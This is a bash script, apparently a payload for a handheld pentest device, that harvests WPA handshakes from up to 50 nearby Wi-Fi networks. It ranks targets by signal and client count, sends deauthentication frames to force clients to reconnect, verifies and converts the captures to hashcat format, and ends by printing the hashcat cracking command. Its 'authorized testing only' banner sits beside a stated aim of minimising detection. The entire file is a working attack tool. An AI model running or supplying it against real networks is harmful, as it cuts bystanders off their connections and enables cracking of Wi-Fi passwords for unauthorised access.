#!/bin/bash
# Title: Handshake Factory
# Author: bad-antics
# Description: Industrial-scale WPA handshake harvester with smart targeting
# Category: nullsec/attack
# Version: 1.0.0

LOOT_DIR="/mmc/nullsec/handshake_factory"
HANDSHAKES_DIR="$LOOT_DIR/handshakes"
LOG_FILE="$LOOT_DIR/factory.log"
TARGETS_DB="$LOOT_DIR/targets.db"

mkdir -p "$LOOT_DIR" "$HANDSHAKES_DIR"

log() {
    echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

PROMPT "🏭 HANDSHAKE FACTORY

Industrial WPA harvesting:

• Smart target selection
• Minimal deauth (1-3 pkts)
• Auto-verification
• Hashcat-ready output
• Session persistence

Maximize captures while
minimizing detection.

⚠️ Authorized testing only!"

INTERFACE="${1:-wlan0}"
DEAUTH_COUNT="${2:-3}"
MAX_TARGETS="${3:-50}"

# Initialize SQLite database
sqlite3 "$TARGETS_DB" << 'SQL'
CREATE TABLE IF NOT EXISTS targets (
    bssid TEXT PRIMARY KEY,
    ssid TEXT,
    channel INTEGER,
    signal INTEGER,
    encryption TEXT,
    clients INTEGER DEFAULT 0,
    attempts INTEGER DEFAULT 0,
    captured INTEGER DEFAULT 0,
    last_attempt TEXT,
    handshake_file TEXT
);

CREATE TABLE IF NOT EXISTS sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    start_time TEXT,
    end_time TEXT,
    targets_scanned INTEGER,
    handshakes_captured INTEGER
);
SQL

# Kill interfering processes
airmon-ng check kill &>/dev/null

# Enable monitor mode
SPINNER_START "Enabling monitor mode..."
airmon-ng start $INTERFACE &>/dev/null
MON_IFACE="${INTERFACE}mon"
if ! iwconfig $MON_IFACE &>/dev/null; then
    MON_IFACE="$INTERFACE"
    ip link set $INTERFACE down
    iw dev $INTERFACE set type monitor
    ip link set $INTERFACE up
fi
SPINNER_STOP

# Start session
SESSION_START=$(date '+%Y-%m-%d %H:%M:%S')
sqlite3 "$TARGETS_DB" "INSERT INTO sessions (start_time) VALUES ('$SESSION_START');"
SESSION_ID=$(sqlite3 "$TARGETS_DB" "SELECT last_insert_rowid();")

# Scan for targets
SPINNER_START "Scanning for WPA networks..."

airodump-ng $MON_IFACE -w /tmp/factory_scan --write-interval 1 --output-format csv &
SCAN_PID=$!
sleep 30
kill $SCAN_PID 2>/dev/null

SPINNER_STOP

# Parse and prioritize targets
log "Processing scan results..."

# First pass: networks
grep -E "^([0-9A-Fa-f]{2}:){5}" /tmp/factory_scan*.csv 2>/dev/null | head -$MAX_TARGETS | while IFS=',' read bssid first last chan speed privacy cipher auth power beacons iv lan essid key; do
    # Only WPA/WPA2 targets
    if echo "$privacy" | grep -qE "WPA|WPA2"; then
        # Clean values
        BSSID=$(echo "$bssid" | xargs)
        SSID=$(echo "$essid" | xargs)
        CHAN=$(echo "$chan" | xargs)
        PWR=$(echo "$power" | xargs)
        
        # Check if already captured
        ALREADY_CAPTURED=$(sqlite3 "$TARGETS_DB" "SELECT captured FROM targets WHERE bssid='$BSSID';")
        
        if [ "$ALREADY_CAPTURED" != "1" ]; then
            sqlite3 "$TARGETS_DB" "INSERT OR REPLACE INTO targets (bssid, ssid, channel, signal, encryption, clients, attempts, captured) 
                VALUES ('$BSSID', '$SSID', $CHAN, $PWR, '$privacy', 0, 
                    COALESCE((SELECT attempts FROM targets WHERE bssid='$BSSID'), 0),
                    COALESCE((SELECT captured FROM targets WHERE bssid='$BSSID'), 0));"
        fi
    fi
done

# Second pass: count clients per network
grep -E "^([0-9A-Fa-f]{2}:){5}" /tmp/factory_scan*.csv 2>/dev/null | grep -v "^Station" | while IFS=',' read bssid rest; do
    CLIENT_BSSID=$(echo "$rest" | cut -d',' -f6 | xargs)
    if [ -n "$CLIENT_BSSID" ]; then
        sqlite3 "$TARGETS_DB" "UPDATE targets SET clients = clients + 1 WHERE bssid='$CLIENT_BSSID';"
    fi
done

# Get prioritized target list (by signal * clients)
TARGET_COUNT=$(sqlite3 "$TARGETS_DB" "SELECT COUNT(*) FROM targets WHERE captured=0;")

PROMPT "Found $TARGET_COUNT targets

Top priorities:
$(sqlite3 "$TARGETS_DB" "SELECT ssid, signal, clients FROM targets WHERE captured=0 ORDER BY (signal * -1) * (clients + 1) LIMIT 10;" | while IFS='|' read s p c; do
    echo "• $s [$p dBm, $c clients]"
done)

Press OK to start harvesting."

# Handshake capture function
capture_handshake() {
    local bssid=$1
    local channel=$2
    local ssid=$3
    local outfile="$HANDSHAKES_DIR/${ssid//[^a-zA-Z0-9]/_}_$(date +%s)"
    
    log "Targeting: $ssid ($bssid) on channel $channel"
    
    # Update attempt count
    sqlite3 "$TARGETS_DB" "UPDATE targets SET attempts = attempts + 1, last_attempt = '$(date '+%Y-%m-%d %H:%M:%S')' WHERE bssid='$bssid';"
    
    # Set channel
    iw dev $MON_IFACE set channel $channel 2>/dev/null
    
    # Start capture
    timeout 30 airodump-ng $MON_IFACE -c $channel --bssid $bssid -w "$outfile" --output-format pcap &>/dev/null &
    CAPTURE_PID=$!
    
    sleep 3
    
    # Smart deauth - only if clients exist
    CLIENTS=$(sqlite3 "$TARGETS_DB" "SELECT clients FROM targets WHERE bssid='$bssid';")
    
    if [ "$CLIENTS" -gt 0 ]; then
        # Targeted deauth (quieter)
        aireplay-ng -0 $DEAUTH_COUNT -a $bssid $MON_IFACE &>/dev/null
    else
        # Broadcast deauth (last resort)
        aireplay-ng -0 1 -a $bssid $MON_IFACE &>/dev/null
    fi
    
    # Wait for handshake
    sleep 10
    
    # Check for handshake
    if [ -f "${outfile}-01.cap" ]; then
        # Verify with aircrack-ng
        if aircrack-ng "${outfile}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
            log "✓ Captured handshake for $ssid"
            
            # Convert to hashcat format
            cap2hccapx "${outfile}-01.cap" "${outfile}.hccapx" 2>/dev/null
            
            sqlite3 "$TARGETS_DB" "UPDATE targets SET captured=1, handshake_file='${outfile}-01.cap' WHERE bssid='$bssid';"
            
            kill $CAPTURE_PID 2>/dev/null
            return 0
        fi
    fi
    
    kill $CAPTURE_PID 2>/dev/null
    rm -f ${outfile}*.cap ${outfile}*.csv 2>/dev/null
    return 1
}

# Main harvesting loop
CAPTURED=0
ATTEMPTED=0
TARGETS=$(sqlite3 "$TARGETS_DB" "SELECT bssid, channel, ssid FROM targets WHERE captured=0 ORDER BY (signal * -1) * (clients + 1) LIMIT $MAX_TARGETS;")

while IFS='|' read -r bssid channel ssid; do
    [ -z "$bssid" ] && continue
    
    ((ATTEMPTED++))
    
    # Status update
    PROMPT "🏭 FACTORY STATUS

Target $ATTEMPTED of $TARGET_COUNT
Current: $ssid

Captured: $CAPTURED
Remaining: $((TARGET_COUNT - ATTEMPTED))

Working..."

    if capture_handshake "$bssid" "$channel" "$ssid"; then
        ((CAPTURED++))
        LED G FAST
        sleep 1
        LED G SOLID
    fi
    
    # Brief pause between targets
    sleep 2
    
done <<< "$TARGETS"

# End session
SESSION_END=$(date '+%Y-%m-%d %H:%M:%S')
sqlite3 "$TARGETS_DB" "UPDATE sessions SET end_time='$SESSION_END', targets_scanned=$ATTEMPTED, handshakes_captured=$CAPTURED WHERE id=$SESSION_ID;"

# Cleanup
airmon-ng stop $MON_IFACE &>/dev/null 2>&1

# Generate hashcat-ready file
COMBO_FILE="$LOOT_DIR/all_handshakes_$(date +%Y%m%d).hccapx"
cat "$HANDSHAKES_DIR"/*.hccapx > "$COMBO_FILE" 2>/dev/null

# Final report
TOTAL_CAPTURED=$(sqlite3 "$TARGETS_DB" "SELECT COUNT(*) FROM targets WHERE captured=1;")
TOTAL_ATTEMPTED=$(sqlite3 "$TARGETS_DB" "SELECT SUM(attempts) FROM targets;")

PROMPT "✅ FACTORY COMPLETE

Session Results:
• Attempted: $ATTEMPTED
• Captured: $CAPTURED
• Success Rate: $(echo "scale=1; $CAPTURED * 100 / $ATTEMPTED" | bc 2>/dev/null || echo 0)%

Lifetime Stats:
• Total Captured: $TOTAL_CAPTURED
• Total Attempts: $TOTAL_ATTEMPTED

Handshakes: $HANDSHAKES_DIR
Combined: $COMBO_FILE

Crack with:
hashcat -m 2500 $COMBO_FILE wordlist.txt"

# Show captured networks
DIALOG "View captured networks?

[1] Yes
[2] No" VIEW

if [ "$VIEW" = "1" ]; then
    CAPTURED_LIST=$(sqlite3 "$TARGETS_DB" "SELECT ssid, signal, handshake_file FROM targets WHERE captured=1;")
    
    PAGER_CONTENT="CAPTURED HANDSHAKES\n==================\n"
    while IFS='|' read ssid signal file; do
        PAGER_CONTENT="$PAGER_CONTENT\n✓ $ssid [$signal dBm]\n  File: $file\n"
    done <<< "$CAPTURED_LIST"
    
    echo -e "$PAGER_CONTENT" | PAGER
fi

log "Factory session complete. $CAPTURED/$ATTEMPTED handshakes captured."
